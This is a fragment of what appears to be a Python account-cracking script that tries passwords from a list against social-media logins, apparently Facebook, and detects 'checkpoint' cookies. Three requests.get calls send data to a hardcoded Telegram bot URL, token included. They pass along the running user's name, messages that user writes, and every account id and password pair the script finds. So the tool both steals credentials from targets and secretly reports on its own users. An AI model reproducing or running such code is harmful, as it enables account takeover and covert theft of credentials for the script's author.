...
try:
    ...
    nameask()
requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6118288082&text=THIS USER USING FREE VERSION\n" + " NAME : "+uname)
...
def contact():
	...
	if admin in ['1']:
		...
		requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6118288082&text=" + "NAME : " + uname + "\nMESSAGE : " + message + "")
		linex()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6118288082&text="+uname+"\n[ "+idf+' | '+pw+ " ]")
